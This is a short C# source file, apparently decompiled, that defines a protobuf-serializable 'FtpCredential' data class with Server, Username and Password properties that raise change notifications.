using ProtoBuf;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "FtpCredential")]
	public class FtpCredential : INotifyPropertyChanged
	{
		private string _server;

		private string _username;

		private string _password;

		[ProtoMember(1, Name = "Server")]
		public string Server
		{
			get
			{
				return _server;
			}
			set
			{
				_server = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Server"));
			}
		}

		[ProtoMember(2, Name = "Username")]
		public string Username
		{
			get
			{
				return _username;
			}
			set
			{
				_username = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Username"));
			}
		}

		[ProtoMember(3, Name = "Password")]
		public string Password
		{
			get
			{
				return _password;
			}
			set
			{
				_password = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Password"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;
	}
}
